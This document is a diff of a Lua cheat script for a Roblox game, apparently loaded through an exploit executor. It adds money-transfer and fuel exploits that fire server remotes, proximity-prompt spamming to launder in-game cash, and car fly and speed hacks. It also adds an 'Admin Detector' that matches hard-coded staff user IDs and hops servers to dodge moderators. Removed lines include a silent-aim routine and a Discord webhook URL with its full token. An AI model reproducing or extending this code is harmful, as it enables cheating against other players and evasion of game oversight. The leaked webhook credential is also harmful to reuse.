         ADD_BTN(C_EXT, "Send Money", function()
-            if LPLR:FindFirstChild("BashAppCooldown") then
-                NOTIFY("Extras", "Still on cooldown! Wait a moment.", 3)
-                return
-            end
-            if not selPlr then
-                NOTIFY("Extras", "Select a player!", 3)
-                return
-            end
-            local n = tonumber(sndAmt)
-            if not n or n <= 0 then
-                NOTIFY("Extras", "Enter a valid amount!", 3)
-                return
+            if not selPlr or selPlr == "" then return NOTIFY("Extras", "Please select a target player first!", 2) end
+
+            local numAmt = tonumber(sndAmt)
+            if not numAmt or numAmt <= 0 then return NOTIFY("Extras", "Please input a valid amount to send!", 2) end
+
+            -- NYC limit max per transaccion (Interception constraint)
+            if numAmt > 100000 then
+                sndAmt = "100000"
+                AMT_INP.Text = "100000"
+                return NOTIFY("Extras", "Max limit is 100k! Adjusted. Click Send again.", 3)
             end
 
-            local ev = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvents") and
-                game:GetService("ReplicatedStorage").RemoteEvents:FindFirstChild("BashApp")
-            if ev then
-                NOTIFY("Extras", "Sending $" .. n .. " to " .. selPlr, 3)
-                ev:FireServer(n, selPlr)
-            end
+            pcall(function()
+                local event = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SendMoney")
+                event:FireServer(selPlr, numAmt)
+            end)
+
+            NOTIFY("Extras", "Transferred $" .. tostring(numAmt) .. " to " .. selPlr, 3)
         end)
 
         ADD_BTN(C_EXT, "Clean All Dirty Money", function()
-            local stats = game:GetService("ReplicatedStorage").PlayerData:FindFirstChild(LPLR.Name) and
-                game:GetService("ReplicatedStorage").PlayerData[LPLR.Name]:FindFirstChild("Statistics")
-            local dirtyValue = stats and stats:FindFirstChild("CashDirty") and stats.CashDirty.Value or 0
-            if dirtyValue <= 0 then
-                NOTIFY("Extras", "You don't have any dirty cash!", 3)
-                return
+            local hrp = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart")
+            if not hrp then return NOTIFY("Laundromat", "Character Not Found!", 2) end
+
+            -- Guarda la posición original del jugador antes de escaparse a lavar dinero
+            local initialPos = hrp.CFrame
+            local laundromatPos = CFrame.new(-58, 90, 412)
+
+            NOTIFY("Laundromat", "Teleporting to Laundry...", 2)
+            if typeof(DO_TP) == "function" then
+                DO_TP(laundromatPos)
+            else
+                hrp.CFrame = laundromatPos
             end
 
-            local ws = workspace:FindFirstChild("Washers")
-            if not ws then
-                NOTIFY("Extras", "Washers folder not found!", 3)
-                return
-            end
+            task.wait(0.5) -- Pausa mínima para que el servidor procese el TP interior
 
-            local oldCFrame = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") and
-                LPLR.Character.HumanoidRootPart.CFrame
-            if not oldCFrame then return end
+            local dryers = workspace:FindFirstChild("MoneyDryers")
+            if dryers then
+                local children = dryers:GetChildren()
+                local dryer5 = children[93] and children[93]:FindFirstChild("WashingPromptPart") and
+                    children[93].WashingPromptPart:FindFirstChild("ProximityPrompt")
+                local dryer4 = children[94] and children[94]:FindFirstChild("WashingPromptPart") and
+                    children[94].WashingPromptPart:FindFirstChild("ProximityPrompt")
 
-            local done = false
-            for _, w in pairs(ws:GetDescendants()) do
-                if w:IsA("ProximityPrompt") and w.ActionText == "WASH DIRTY CASH" and w.Enabled then
-                    local p = w.Parent
-                    if p and p:IsA("BasePart") then
-                        LPLR.Character:SetPrimaryPartCFrame(p.CFrame * CFrame.new(0, 3, 0))
-                        task.wait(0.2)
-                        if fireproximityprompt then
-                            fireproximityprompt(w)
-                        else
-                            w:InputHoldBegin()
-                            task.wait(w.HoldDuration + 0.1)
-                            w:InputHoldEnd()
-                        end
-                        NOTIFY("Extras", "Washing money...", 3)
-                        task.wait(1)
-                        if LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") then
-                            LPLR.Character.HumanoidRootPart.CFrame = oldCFrame
-                        end
-                        done = true
-                        break
+                if dryer4 and dryer5 then
+                    NOTIFY("Laundromat", "Laundering Cash... (Hold)", 2)
+                    for _ = 1, 20 do
+                        task.spawn(function()
+                            pcall(function() fireproximityprompt(dryer5) end)
+                        end)
+                        task.spawn(function()
+                            pcall(function() fireproximityprompt(dryer4) end)
+                        end)
                     end
+                    task.wait(1.5) -- Darle tiempo a los prompts a quemarse (se activa instantáneo por el x20 override)
+                else
+                    NOTIFY("Laundromat", "Dryers Not Loaded! Cancelling...", 3)
                 end
+            else
+                NOTIFY("Laundromat", "MoneyDryers Folder Not Found!", 3)
             end
-            if not done then
-                NOTIFY("Extras", "No washers available!", 3)
+
+            -- Retorno Físico Invisible
+            NOTIFY("Laundromat", "Job Finished! Returning...", 2)
+            if typeof(DO_TP) == "function" then
+                DO_TP(initialPos)
+            else
+                hrp.CFrame = initialPos
             end
         end)
     end
     task.spawn(SETUP_MISC)
+
+    local function SETUP_OTHERS()
+        local CL, CR = ADD_SPLIT(P_OTH)
+        CL.Parent.Size = UDim2.new(1, -10, 1, -10)
+        CL.Parent.Position = UDim2.new(0, 5, 0, 5)
+        CL.Size = UDim2.new(0.5, -2, 1, 0)
+        CL.AutomaticSize = Enum.AutomaticSize.Y
+
+        local CL_LAY = Instance.new("UIListLayout", CL)
+        CL_LAY.Padding = UDim.new(0, 10)
+        CL_LAY.SortOrder = Enum.SortOrder.LayoutOrder
+        CL_LAY.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+        CR.Size = UDim2.new(0.5, -2, 1, 0)
+        CR.AutomaticSize = Enum.AutomaticSize.Y
+
+        local CR_LAY = Instance.new("UIListLayout", CR)
+        CR_LAY.Padding = UDim.new(0, 10)
+        CR_LAY.SortOrder = Enum.SortOrder.LayoutOrder
+        CR_LAY.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+        local C_CARMODS = MK_CARD(CL, "Cars Mods", "rbxassetid://77304301427389")
+
+        -- Car Fly variables & helpers
+        local isCarFlying = false
+        local currentVehicle = nil
+        local flyBV, flyBG
+        local carFlyConnection
+
+        local function get_vic()
+            local char = LPLR.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if hum and hum.SeatPart and hum.SeatPart.Name == "DriveSeat" then
+                return hum.SeatPart.Parent, hum.SeatPart
+            end
+            return nil, nil
+        end
+
+        local function cleanupCarFly()
+            if flyBV then
+                flyBV:Destroy(); flyBV = nil
+            end
+            if flyBG then
+                flyBG:Destroy(); flyBG = nil
+            end
+            if carFlyConnection then
+                carFlyConnection:Disconnect(); carFlyConnection = nil
+            end
+            isCarFlying = false
+        end
+
+        local CarFlyTgl = nil
+        CarFlyTgl = ADD_TGL_KB(C_CARMODS, "Car Fly", false, nil, function(v)
+            isCarFlying = v
+            if not v then
+                cleanupCarFly()
+                return
+            end
+
+            local vic, seat = get_vic()
+            if not vic or not seat then
+                NOTIFY("Movement", "Please sit in a DriveSeat first!", 3)
+                isCarFlying = false
+                task.spawn(function() CarFlyTgl:SET(false) end)
+                return
+            end
+
+            currentVehicle = vic
+            local root = vic.PrimaryPart or seat
+
+            flyBV = Instance.new("BodyVelocity")
+            flyBV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            flyBV.Velocity = Vector3.new(0, 0, 0)
+            flyBV.Parent = root
+
+            flyBG = Instance.new("BodyGyro")
+            flyBG.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+            flyBG.CFrame = root.CFrame
+            flyBG.P = 5000
+            flyBG.Parent = root
+
+            carFlyConnection = game:GetService("RunService").Heartbeat:Connect(function()
+                local vic, seat = get_vic()
+                if not vic or not isCarFlying then
+                    cleanupCarFly()
+                    if CarFlyTgl.SET then CarFlyTgl:SET(false) end
+                    return
+                end
+
+                local root = vic.PrimaryPart or seat
+                local camCF = workspace.CurrentCamera.CFrame
+                local moveDir = Vector3.new(0, 0, 0)
+
+                local UIS = game:GetService("UserInputService")
+                if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + camCF.LookVector end
+                if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - camCF.LookVector end
+                if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - camCF.RightVector end
+                if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + camCF.RightVector end
+                if UIS:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
+                if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then moveDir = moveDir - Vector3.new(0, 1, 0) end
+
+                if moveDir.Magnitude > 0 then
+                    flyBV.Velocity = moveDir.Unit * _G.EXE.GUN_MODS.CarFlySpeed
+                else
+                    flyBV.Velocity = Vector3.new(0, 0, 0)
+                end
+
+                flyBG.CFrame = camCF
+            end)
+
+            NOTIFY("Movement", "Car Fly Enabled", 2)
+        end)
+
+        ADD_SLD(C_CARMODS, "Car Fly Speed", 0, 1000, _G.EXE.GUN_MODS.CarFlySpeed or 150, function(v)
+            _G.EXE.GUN_MODS.CarFlySpeed = v
+        end)
+
+        -- Car Speed logic
+        local carSpeedConnection
+        local isCarSpeed = false
+        local carSpeedValue = 150
+
+        local CarSpeedTgl = nil
+        CarSpeedTgl = ADD_TGL(C_CARMODS, "Car Speed", false, function(v)
+            isCarSpeed = v
+            if v then
+                carSpeedConnection = game:GetService("RunService").Heartbeat:Connect(function()
+                    local vic, seat = get_vic()
+                    if vic and seat then
+                        local root = vic.PrimaryPart or seat
+                        if seat.Throttle == 1 then
+                            local vel = root.CFrame.LookVector * carSpeedValue
+                            root.AssemblyLinearVelocity = Vector3.new(vel.X, root.AssemblyLinearVelocity.Y, vel.Z)
+                        elseif seat.Throttle == -1 then
+                            local vel = -root.CFrame.LookVector * (carSpeedValue * 0.6)
+                            root.AssemblyLinearVelocity = Vector3.new(vel.X, root.AssemblyLinearVelocity.Y, vel.Z)
+                        end
+                    end
+                end)
+                NOTIFY("Car Mods", "Car Speed Enabled", 2)
+            else
+                if carSpeedConnection then
+                    carSpeedConnection:Disconnect()
+                    carSpeedConnection = nil
+                end
+                NOTIFY("Car Mods", "Car Speed Disabled", 2)
+            end
+        end)
+
+        ADD_SLD(C_CARMODS, "Car Speed Value", 50, 500, 150, function(v)
+            carSpeedValue = v
+        end)
+
+
+        -- Infinite Fuel logic
+        local infFuelConnection
+        ADD_TGL_KB(C_CARMODS, "Infinite Fuel", false, nil, function(v)
+            if v then
+                NOTIFY("Car Mods", "Infinite Fuel Enabled", 2)
+                infFuelConnection = RS.Heartbeat:Connect(function()
+                    local char = LPLR.Character
+                    local hum = char and char:FindFirstChildOfClass("Humanoid")
+                    if hum and hum.SeatPart and hum.SeatPart.Name == "DriveSeat" then
+                        pcall(function()
+                            local car = hum.SeatPart.Parent
+                            local fuelRemote = game:GetService("ReplicatedStorage"):FindFirstChild("FuelRemotes")
+                            if fuelRemote and fuelRemote:FindFirstChild("SetFuel") then
+                                fuelRemote.SetFuel:FireServer(car, 999999)
+                            end
+                        end)
+                    end
+                end)
+            else
+                NOTIFY("Car Mods", "Infinite Fuel Disabled", 2)
+                if infFuelConnection then
+                    infFuelConnection:Disconnect()
+                    infFuelConnection = nil
+                end
+            end
+        end)
+
+        -- Instant Brake logic
+        local instantBrakeConnection
+        local isInstantBrake = false
+        ADD_TGL(C_CARMODS, "Instant Brake", false, function(v)
+            isInstantBrake = v
+            if v then
+                instantBrakeConnection = game:GetService("UserInputService").InputBegan:Connect(function(input,
+                                                                                                         gameProcessedEvent)
+                    if gameProcessedEvent then return end
+                    if input.KeyCode == Enum.KeyCode.S and isInstantBrake then
+                        pcall(function()
+                            local char = LPLR.Character
+                            local hum = char and char:FindFirstChildOfClass("Humanoid")
+                            if hum and hum.SeatPart and hum.SeatPart.Name == "DriveSeat" then
+                                local car = hum.SeatPart.Parent
+                                local root = car.PrimaryPart or hum.SeatPart
+                                if root then
+                                    root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                                end
+                            end
+                        end)
+                    end
+                end)
+                NOTIFY("Car Mods", "Instant Brake Enabled", 2)
+            else
+                if instantBrakeConnection then
+                    instantBrakeConnection:Disconnect()
+                    instantBrakeConnection = nil
+                end
+                NOTIFY("Car Mods", "Instant Brake Disabled", 2)
+            end
+        end)
+
+        -- Auto Backfire logic
+        local backfireThread
+        local isBackfire = false
+        ADD_TGL(C_CARMODS, "Auto Backfire", false, function(v)
+            isBackfire = v
+            if v then
+                backfireThread = task.spawn(function()
+                    while isBackfire do
+                        pcall(function()
+                            local vic, _ = get_vic()
+                            if vic then
+                                local evt = vic:FindFirstChild("Backfire_FE")
+                                if evt then
+                                    evt:FireServer("Backfire2")
+                                end
+                            end
+                        end)
+                        task.wait(0.1)
+                    end
+                end)
+                NOTIFY("Car Mods", "Auto Backfire Enabled", 2)
+            else
+                isBackfire = false
+                if backfireThread then
+                    task.cancel(backfireThread)
+                    backfireThread = nil
+                end
+                NOTIFY("Car Mods", "Auto Backfire Disabled", 2)
+            end
+        end)
+    end
+    task.spawn(SETUP_OTHERS)
 
     -- ============================================================
     --  CONFIG → SETTINGS & FEEDBACK
@@ -6843,16 +6615,26 @@ local function BUILD_NYH_UI()
             { name = "Gold", icon = "✨" },
         }
         local D_THEME = MK_TH_DRP("UI Theme", 2)
+        local initialThemeIcon = "🔴"
+        for _, th in ipairs(THEME_LIST) do
+            if th.name == CurThemeName then
+                initialThemeIcon = th.icon
+                break
+            end
+        end
+        D_THEME.BTN.Text = "  " .. initialThemeIcon .. "  " .. CurThemeName
         local thH = #THEME_LIST * 30
         D_THEME.SCR.Size = UDim2.new(1, 0, 0, thH)
         D_THEME.OPEN(thH)
         D_THEME.CLOSE()
 
         for i, t in ipairs(THEME_LIST) do
+            local themeName = t.name
+            local themeIcon = t.icon
             local ITM = Instance.new("TextButton", D_THEME.SCR)
             ITM.Size = UDim2.new(1, 0, 0, 30)
             ITM.BackgroundTransparency = 1
-            ITM.Text = "  " .. t.icon .. "  " .. t.name
+            ITM.Text = "  " .. themeIcon .. "  " .. themeName
             ITM.TextColor3 = CFG.COL.TXT
             ITM.Font = Enum.Font.Gotham
             ITM.TextSize = 13
@@ -6862,10 +6644,10 @@ local function BUILD_NYH_UI()
             ITM.MouseEnter:Connect(function() TWN(ITM, { TextColor3 = CFG.COL.ACC }, 0.1) end)
             ITM.MouseLeave:Connect(function() TWN(ITM, { TextColor3 = CFG.COL.TXT }, 0.1) end)
             ITM.MouseButton1Click:Connect(function()
-                D_THEME.BTN.Text = "  " .. t.icon .. "  " .. t.name
+                D_THEME.BTN.Text = "  " .. themeIcon .. "  " .. themeName
                 D_THEME.CLOSE()
-                APPLY_THEME(t.name)
-                NOTIFY("Theme", t.name .. " applied!", 3)
+                APPLY_THEME(themeName)
+                NOTIFY("Theme", themeName .. " applied!", 3)
             end)
         end
 
@@ -6879,16 +6661,19 @@ local function BUILD_NYH_UI()
             { name = "SciFi",      font = Enum.Font.SciFi },
         }
         local D_FONT = MK_TH_DRP("Text Font", 3)
+        D_FONT.BTN.Text = "  " .. CurFontName
         local fH = #FONT_LIST * 30
         D_FONT.SCR.Size = UDim2.new(1, 0, 0, fH)
         D_FONT.OPEN(fH)
         D_FONT.CLOSE()
 
         for i, f in ipairs(FONT_LIST) do
+            local fontName = f.name
+            local fontEnum = f.font
             local ITM = Instance.new("TextButton", D_FONT.SCR)
             ITM.Size = UDim2.new(1, 0, 0, 30)
             ITM.BackgroundTransparency = 1
-            ITM.Text = "  " .. f.name
+            ITM.Text = "  " .. fontName
             ITM.TextColor3 = CFG.COL.TXT
             ITM.Font = Enum.Font.Gotham
             ITM.TextSize = 13
@@ -6898,20 +6683,20 @@ local function BUILD_NYH_UI()
             ITM.MouseEnter:Connect(function() TWN(ITM, { TextColor3 = CFG.COL.ACC }, 0.1) end)
             ITM.MouseLeave:Connect(function() TWN(ITM, { TextColor3 = CFG.COL.TXT }, 0.1) end)
             ITM.MouseButton1Click:Connect(function()
-                D_FONT.BTN.Text = "  " .. f.name
+                D_FONT.BTN.Text = "  " .. fontName
                 D_FONT.CLOSE()
                 -- Aplicar fuente al UI completo
-                APPLY_FONT_UI(f.font)
+                APPLY_FONT_UI(fontEnum)
                 -- Actualizar ESP font (usa Enum.Font directamente)
-                CurFontName = f.name
+                CurFontName = fontName
                 SAVE_CONFIG()
-                ESP_CFG.Font = f.font
-                NOTIFY("Font", f.name .. " applied!", 3)
+                ESP_CFG.Font = fontEnum
+                NOTIFY("Font", fontName .. " applied!", 3)
             end)
         end
 
         -- ── CUSTOM BACKGROUND CARD ─────────────────────────────
-        local BG_CARD = MK_CARD(CR, "Custom Interface", "rbxassetid://10734950309")
+        local BG_CARD = MK_CARD(CL, "Custom Interface", "rbxassetid://10734950309")
         BG_CARD.LayoutOrder = 4
 
         local BG_PREVIEW = Instance.new("ImageLabel", BG_CARD)
@@ -6957,70 +6742,9 @@ local function BUILD_NYH_UI()
         end)
         TRANS_SLD.LayoutOrder = 4
 
-        -- ── SEND FEEDBACK CARD ──────────────────────────────────
-        local FDBK_CARD = MK_CARD(CL, "Send Feedback", "rbxassetid://121092009137441")
-
-        ADD_LBL(FDBK_CARD, "Found a bug or have a suggestion?")
-
-        local FDBK_TXT = ADD_TEXTAREA(FDBK_CARD, "Write your feedback, bug report, or feature request here...", "", 100)
-
-        local DEBOUNCE = false
-        ADD_BTN(FDBK_CARD, "Send to Discord", function()
-            if DEBOUNCE then return NOTIFY("Wait", "Please wait before sending again.", 3) end
-
-            local msg = FDBK_TXT.Text
-            if not msg or msg == "" then
-                return NOTIFY("Error", "Feedback cannot be empty!", 3)
-            end
-            if string.len(msg) < 10 then
-                return NOTIFY("Error", "Feedback must be at least 10 characters.", 3)
-            end
-
-            local req = request or http_request or (syn and syn.request)
-            if not req then
-                return NOTIFY("Error", "Your executor does not support sending requests.", 5)
-            end
-
-            DEBOUNCE = true
-            local payload = {
-                embeds = { {
-                    title = "💬 New Script Feedback",
-                    description = "```\n" .. msg .. "\n```",
-                    color = 0x32A852,
-                    fields = {
-                        { name = "Username", value = LPLR.Name,             inline = true },
-                        { name = "User ID",  value = tostring(LPLR.UserId), inline = true }
-                    },
-                    footer = { text = "WH01AM Feedback" },
-                    timestamp = DateTime.now():ToIsoDate()
-                } }
-            }
-
-            task.spawn(function()
-                local success, respond = pcall(function()
-                    return req({
-                        Url =
-                        "https://discord.com/api/webhooks/1481433215398056087/5yiYW_g6HGoAcxig9zy0YQYX1Ciu3H_5AehQxZk_j0NxnrcWU8Uf7ev5-XmerOix7JGa",
-                        Method = "POST",
-                        Headers = { ["Content-Type"] = "application/json" },
-                        Body = game:GetService("HttpService"):JSONEncode(payload)
-                    })
-                end)
-
-                if success and respond and (respond.StatusCode == 200 or respond.StatusCode == 204) then
-                    NOTIFY("Success", "Thanks for your feedback! Sent to discord.", 4)
-                    FDBK_TXT.Text = ""
-                else
-                    NOTIFY("Error",
-                        "Failed to send feedback. Status: " .. tostring(respond and respond.StatusCode or "Unknown"), 5)
-                end
-                task.wait(5)
-                DEBOUNCE = false
-            end)
-        end)
 
         -- ── EXTRAS & SERVER UTILITIES CARD ──────────────────────
-        local EXTRAS_CARD = MK_CARD(CL, "Extras", "rbxassetid://106507089706013")
+        local EXTRAS_CARD = MK_CARD(CR, "Extras", "rbxassetid://106507089706013")
         EXTRAS_CARD.LayoutOrder = 10
         local E_HDR = EXTRAS_CARD:FindFirstChild("Header")
 
@@ -7110,49 +6834,6 @@ local function BUILD_NYH_UI()
         end)
 
         -- Server Utilities
-        local function ServerHop()
-            local x = {}
-            local s, res = pcall(function()
-                local raw = game:HttpGet("https://games.roblox.com/v1/games/" ..
-                    game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100")
-                return game:GetService("HttpService"):JSONDecode(raw)
-            end)
-            if s and res and res.data then
-                for _, v in ipairs(res.data) do
-                    if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
-                        x[#x + 1] = v.id
-                    end
-                end
-            end
-            if #x > 0 then
-                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
-            else
-                NOTIFY("Server Hop", "No servers found or API Rate Limited!", 3)
-            end
-        end
-
-        local function JoinLowest()
-            local servers = {}
-            local s, parsed = pcall(function()
-                local raw = game:HttpGet("https://games.roblox.com/v1/games/" ..
-                    game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
-                return game:GetService("HttpService"):JSONDecode(raw)
-            end)
-            if s and parsed and parsed.data then
-                for _, v in ipairs(parsed.data) do
-                    if v.playing < v.maxPlayers and v.id ~= game.JobId then
-                        table.insert(servers, v)
-                    end
-                end
-            end
-            table.sort(servers, function(a, b) return a.playing < b.playing end)
-            if #servers > 0 then
-                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[1].id)
-            else
-                NOTIFY("Server", "No other servers found or API Rate Limited!", 3)
-            end
-        end
-
         ADD_BTN(EXTRAS_CARD, "Join Lowest Server", JoinLowest)
         ADD_BTN(EXTRAS_CARD, "Server Hop", ServerHop)
         ADD_BTN(EXTRAS_CARD, "Rejoin", function()
@@ -7176,19 +6857,119 @@ local function BUILD_NYH_UI()
             P.PaddingRight = UDim.new(0, 8)
         end
 
+        local adminConnection
         local T_ADM = ADD_TOG(C_SEC, "Admin Detector", _G.EXE.SECURITY.AdminDetector, function(v)
             _G.EXE.SECURITY.AdminDetector = v
-            NOTIFY("Security", "Admin Detector: " .. (v and "Enabled" or "Disabled"), 2)
-        end)
+            local Players = game:GetService("Players")
+            local AdminIDs = {
+                [193675379] = "Owner",
+                [7270095233] = "Admin",
+                [6219914993] = "Admin",
+                [169641570] = "Admin",
+                [167283473] = "Admin",
+                [7322940967] = "Admin",
+                [4775061] = "Admin",
+                [2473529312] = "Admin",
+                [154943097] = "Admin",
+                [8162310250] = "Admin",
+                [3106275464] = "Analytics",
+                [1748679794] = "Tester",
+                [443186070] = "Tester",
+                [2520899372] = "Tester",
+                [429393318] = "Tester",
+                [8469523389] = "Tester",
+                [1257073083] = "Contributor"
+            }
+
+            local function KickPlayer()
+                Players.LocalPlayer:Kick("Admin detected! Changing server...")
+                task.wait(2)
+
+                local HttpService = game:GetService("HttpService")
+                local TeleportService = game:GetService("TeleportService")
+                local PlaceId = game.PlaceId
+                local url = "https://games.roblox.com/v1/games/" .. tostring(PlaceId) .. "/servers/Public?sortOrder=Asc&limit=100"
+
+                local function getServers(c)
+                    local u = c and (url .. "&cursor=" .. c) or url
+                    local s, r = pcall(function() return HttpService:JSONDecode(game:HttpGet(u)) end)
+                    return (s and r and r.data) and r or nil
+                end
+
+                local serverToHop, cursor = nil, nil
+                while not serverToHop do
+                    local data = getServers(cursor)
+                    if data and data.data then
+                        for _, sv in ipairs(data.data) do
+                            if type(sv) == "table" and sv.id ~= game.JobId and sv.playing and sv.playing < sv.maxPlayers - 1 then
+                                serverToHop = sv.id
+                                break
+                            end
+                        end
+                        cursor = data.nextPageCursor
+                        if not cursor then break end
+                    else
+                        break
+                    end
+                end
+
+                if serverToHop then
+                    TeleportService:TeleportToPlaceInstance(PlaceId, serverToHop, Players.LocalPlayer)
+                else
+                    TeleportService:Teleport(PlaceId, Players.LocalPlayer)
+                end
+            end
+
+            local function checkAdmin(plr)
+                if AdminIDs[plr.UserId] then
+                    KickPlayer()
+                end
+            end
+
+            if v then
+                NOTIFY("Security", "Admin Detector: Enabled", 2)
+                if not adminConnection then
+                    adminConnection = Players.PlayerAdded:Connect(checkAdmin)
+                    for _, plr in ipairs(Players:GetPlayers()) do
+                        checkAdmin(plr)
+                    end
+                end
+            else
+                NOTIFY("Security", "Admin Detector: Disabled", 2)
+                if adminConnection then
+                    adminConnection:Disconnect()
+                    adminConnection = nil
+                end
+            end
+        end, true)
         T_ADM.ROW.LayoutOrder = 1
         STYLE_ROW(T_ADM.ROW)
 
         local T_ALV = ADD_TOG(C_SEC, "Auto-Leave", _G.EXE.SECURITY.AutoLeave, function(v)
             _G.EXE.SECURITY.AutoLeave = v
             NOTIFY("Security", "Auto-Leave: " .. (v and "Enabled" or "Disabled"), 2)
-        end)
+        end, true)
         T_ALV.ROW.LayoutOrder = 2
         STYLE_ROW(T_ALV.ROW)
+
+        -- [ BETA OPTIONS SECTION ]
+        local BETA_CARD = MK_CARD(CL, "Beta Options", "rbxassetid://106507089706013")
+        BETA_CARD.LayoutOrder = 12
+
+        local T_BETA = ADD_TOG(BETA_CARD, "Sidebar Tabs (Beta)", CurSidebarTabs, function(v)
+            CurSidebarTabs = v
+            UPDATE_SIDEBAR_MODE(v)
+            SAVE_CONFIG()
+        end, true)
+        T_BETA.ROW.LayoutOrder = 1
+        STYLE_ROW(T_BETA.ROW)
+
+        local T_SMOOTH_DRAG = ADD_TOG(BETA_CARD, "Enable Smooth UI Drag", CurSmoothDrag, function(v)
+            CurSmoothDrag = v
+            SAVE_CONFIG()
+        end, true)
+        T_SMOOTH_DRAG.ROW.LayoutOrder = 2
+        STYLE_ROW(T_SMOOTH_DRAG.ROW)
     end
     task.spawn(SETUP_CONFIG)
 
@@ -7196,11 +6977,7 @@ local function BUILD_NYH_UI()
     task.spawn(function()
         CUR_BTN = B_HOM
         CUR_PAG = P_HOM
-        TWN(B_HOM, {
-            TextColor3 = Color3.new(0, 0, 0),
-            BackgroundTransparency = 0,
-            BackgroundColor3 = CFG.COL.ACC
-        })
+        UPDATE_TAB_VISUALS(B_HOM, true)
         P_HOM.Visible = true
 
 
@@ -7246,7 +7023,14 @@ local function BUILD_NYH_UI()
             RSZ.InputBegan:Connect(function(I)
                 if I.UserInputType == Enum.UserInputType.MouseButton1 or I.UserInputType == Enum.UserInputType.Touch then
                     RS_S.ON = true; RS_S.ST = I.Position; RS_S.SZ = MAIN.AbsoluteSize; RS_S.IP = I
-                    I.Changed:Connect(function() if I.UserInputState == Enum.UserInputState.End then RS_S.ON = false end end)
+                    I.Changed:Connect(function()
+                        if I.UserInputState == Enum.UserInputState.End then
+                            RS_S.ON = false
+                            CurSizeX = MAIN.Size.X.Offset
+                            CurSizeY = MAIN.Size.Y.Offset
+                            SAVE_CONFIG()
+                        end
+                    end)
                 end
             end)
             UIS.InputChanged:Connect(function(I)
@@ -7259,18 +7043,12 @@ local function BUILD_NYH_UI()
             end)
         end
 
-        -- [ MOUSE ICON: activo cuando el UI está abierto (solo PC) ]
-        if not UIS.TouchEnabled then
-            UIS.MouseIconEnabled = MAIN.Visible
-            MAIN:GetPropertyChangedSignal("Visible"):Connect(function()
-                UIS.MouseIconEnabled = MAIN.Visible
-            end)
-        end
 
         -- [ KEYBOARD TOGGLE (RightCtrl) ]
         UIS.InputBegan:Connect(function(I, G)
             if not G and I.KeyCode == CFG.KEY then
                 MAIN.Visible = not MAIN.Visible
+                if MAIN.Visible and RefreshDealerList then RefreshDealerList() end
             end
         end)
 
@@ -7280,7 +7058,7 @@ local function BUILD_NYH_UI()
                 local MB_S = { ON = false, ST = nil, PS = nil, IP = nil }
                 MAIN.AnchorPoint = Vector2.new(0.5, 0.5)
                 MAIN.Position = UDim2.new(0.5, 0, 0.5, 0)
-                MAIN.Size = UDim2.new(0.6, 0, 0.5, 0)
+                -- (Size is already safely handled during creation)
 
                 local MTOG = Instance.new("ImageButton", SCR)
                 MTOG.Name, MTOG.Size, MTOG.Position = "MTOG", UDim2.new(0, 50, 0, 50), UDim2.new(1, -70, 0.2, 0)
@@ -7288,7 +7066,10 @@ local function BUILD_NYH_UI()
                 MTOG.ImageColor3, MTOG.ZIndex = CFG.COL.ACC, 100
                 RND(MTOG, 25); STR(MTOG, CFG.COL.ACC, 2)
 
-                MTOG.MouseButton1Click:Connect(function() MAIN.Visible = not MAIN.Visible end)
+                MTOG.MouseButton1Click:Connect(function()
+                    MAIN.Visible = not MAIN.Visible
+                    if MAIN.Visible and RefreshDealerList then RefreshDealerList() end
+                end)
                 MTOG.InputBegan:Connect(function(I)
                     if I.UserInputType == Enum.UserInputType.Touch or I.UserInputType == Enum.UserInputType.MouseButton1 then
                         MB_S.ON, MB_S.ST, MB_S.PS, MB_S.IP = true, I.Position, MTOG.Position, I
@@ -7308,152 +7089,18 @@ local function BUILD_NYH_UI()
         end
 
         -- [ APPLY SAVED SETTINGS ]
+        APPLY_THEME(CurThemeName)
         APPLY_FONT_UI(Enum.Font[CurFontName] or Enum.Font.GothamBold)
         pcall(function()
             if MAIN:FindFirstChild("BG") then
                 MAIN.BG.ImageTransparency = CurBGTrans
             end
         end)
+        pcall(function()
+            UPDATE_SIDEBAR_MODE(CurSidebarTabs)
+        end)
     end) -- end global init spawn
 
     NOTIFY("WH01AM", "SCRIPT LOADED!", 4)
 end
-
--- ── SILENT AIM LOGIC (BACKGROUND CACHE & HOOK) ────────────────────────────────
-_G.EXE.SILENT_AIM_TARGET = nil
-
-task.spawn(function()
-    local RS = game:GetService("RunService")
-    local UIS = game:GetService("UserInputService")
-    local Players = game:GetService("Players")
-
-    RS.RenderStepped:Connect(function()
-        local SA_CFG = _G.EXE.SILENT_AIM
-        if not SA_CFG or not SA_CFG.Enabled then
-            _G.EXE.SILENT_AIM_TARGET = nil
-            return
-        end
-
-        local bestTarget = nil
-        local shortestDistance = math.huge
-        local mousePos = UIS:GetMouseLocation()
-        if UIS.TouchEnabled and not UIS.KeyboardEnabled then
-            local vp = workspace.CurrentCamera.ViewportSize
-            mousePos = Vector2.new(vp.X / 2, vp.Y / 2)
-        end
-
-        for _, p in ipairs(Players:GetPlayers()) do
-            if p ~= LPLR and p.Character and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
-                local targetPartName = SA_CFG.TargetPart
-                if targetPartName == "Random" then
-                    targetPartName = math.random() > 0.5 and "Head" or "HumanoidRootPart"
-                end
-
-                local targetPart = p.Character:FindFirstChild(targetPartName) or p.Character:FindFirstChild("Head")
-
-                if targetPart then
